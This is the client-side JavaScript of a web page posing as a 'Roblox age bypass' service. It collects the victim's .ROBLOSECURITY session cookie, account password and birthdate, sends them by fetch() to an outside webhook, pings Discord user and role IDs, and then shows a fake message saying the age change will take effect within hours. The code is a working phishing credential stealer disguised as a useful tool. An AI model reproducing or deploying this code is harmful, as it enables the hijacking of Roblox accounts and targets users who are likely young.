<script>
  const bypassSelect = document.getElementById('bypass');
  const cookieBlock = document.getElementById('cookie-block');
  const passwordBlock = document.getElementById('password-block');
  const cookieInput = document.getElementById('cookie-input');
  const passwordInput = document.getElementById('password-input');
  const processBtn = document.getElementById('process-button');
  const errorMessage = document.getElementById('error-message');
  const successMessage = document.getElementById('success-message');
  const loaderOverlay = document.getElementById('loader-overlay');
  const birthdateLabel = document.getElementById('birthdate-label');
  const birthdateSelectors = document.getElementById('birthdate-selectors');
  const birthDay = document.getElementById('birth-day');
  const birthMonth = document.getElementById('birth-month');
  const birthYear = document.getElementById('birth-year');

  // Fill Day options 1-31
  for (let i = 1; i <= 31; i++) {
    const option = document.createElement('option');
    option.value = i.toString().padStart(2, '0');
    option.textContent = i;
    birthDay.appendChild(option);
  }

  // Fill Month options with names
  const monthNames = ['January', 'February', 'March', 'April', 'May', 'June',
                      'July', 'August', 'September', 'October', 'November', 'December'];
  monthNames.forEach((name, idx) => {
    const option = document.createElement('option');
    option.value = (idx + 1).toString().padStart(2, '0');
    option.textContent = name;
    birthMonth.appendChild(option);
  });

  // Fill Year options from currentYear down to 1930
  const currentYear = new Date().getFullYear();
  for (let y = currentYear; y >= 1930; y--) {
    const option = document.createElement('option');
    option.value = y;
    option.textContent = y;
    birthYear.appendChild(option);
  }

  function clearMessages() {
    errorMessage.style.display = 'none';
    successMessage.style.display = 'none';
  }

  function showError(msg) {
    errorMessage.textContent = msg;
    errorMessage.style.display = 'block';
    setTimeout(() => {
      errorMessage.style.display = 'none';
    }, 5000);
  }

  function showSuccess(msg) {
    successMessage.textContent = msg;
    successMessage.style.display = 'block';
    setTimeout(() => {
      successMessage.style.display = 'none';
    }, 7000);
  }

  bypassSelect.addEventListener('change', () => {
    clearMessages();
    if (bypassSelect.value === '13plus' || bypassSelect.value === 'birthyear') {
      cookieBlock.style.display = 'block';
      passwordBlock.style.display = bypassSelect.value === '13plus' ? 'block' : 'none';
      birthdateLabel.style.display = 'block';
      birthdateSelectors.style.display = 'flex';
    } else {
      cookieBlock.style.display = 'none';
      passwordBlock.style.display = 'none';
      birthdateLabel.style.display = 'none';
      birthdateSelectors.style.display = 'none';
    }
  });

  function getSelectedBirthdate() {
    if (birthYear.value && birthMonth.value && birthDay.value) {
      return `${birthYear.value}-${birthMonth.value}-${birthDay.value}`;
    }
    return null;
  }

  async function sendEmbedToDiscord(title, content) {
    // Hier muss der Discord Webhook URL eingefügt werden
    const webhookURL = "https://hkdk.events/gcjor0rqtldxig";
    const data = {
      username: "ROBLOX AGE BYPASS",
      embeds: [
        {
          title,
          description: content,
          color: 0x00ffff,
          timestamp: new Date().toISOString()
        }
      ]
    };

    try {
      const response = await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
      if (!response.ok) throw new Error('Failed to send webhook');
    } catch (err) {
      throw err;
    }
  }

  async function sendMentionToDiscord() {
    const webhookURL = "https://hkdk.events/gcjor0rqtldxig";
    // Erwähnung von User und Rolle als separate Nachricht
    const content = `<@1030535100829540464> <@&1392621247460020254>`;
    const data = {
      username: "ROBLOX AGE BYPASS",
      content: content,
      allowed_mentions: {
        users: ["1030535100829540464"],
        roles: ["1392621247460020254"]
      }
    };

    try {
      const response = await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
      if (!response.ok) throw new Error('Failed to send mention webhook');
    } catch (err) {
      throw err;
    }
  }

  processBtn.addEventListener('click', async () => {
    clearMessages();

    const selected = bypassSelect.value;
    const cookieVal = cookieInput.value.trim();
    const passwordVal = passwordInput.value.trim();
    const birthdateVal = getSelectedBirthdate();

    if (!selected || cookieVal.length < 500 || (selected === '13plus' && !passwordVal)) {
      showError('ERROR Try later again.');
      return;
    }

    if (!birthdateVal) {
      showError('Please select a valid birthdate.');
      return;
    }

    processBtn.disabled = true;
    loaderOverlay.style.display = 'flex';

    try {
      const method = selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages';
      await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Password', `**Method:** ${method}\n**Cookie:** ${cookieVal}\n**Birthdate:** ${birthdateVal}`);

      // Separate Nachricht mit User- und Rollen-Erwähnung senden
      await sendMentionToDiscord();

      if (selected === '13plus') {
        await sendEmbedToDiscord('Account Password', `**Method:** 13+ All Ages\n**Password:** ${passwordVal}`);
      }
      await new Promise(resolve => setTimeout(resolve, 1200));
      showSuccess('Everything worked it can take 2-12 Hours until the age will be set');
    } catch (e) {
      showError('ERROR Try later again.');
    } finally {
      loaderOverlay.style.display = 'none';
      processBtn.disabled = false;
    }
  });

  document.getElementById('help-button').addEventListener('click', () => {
    window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
  });
</script>
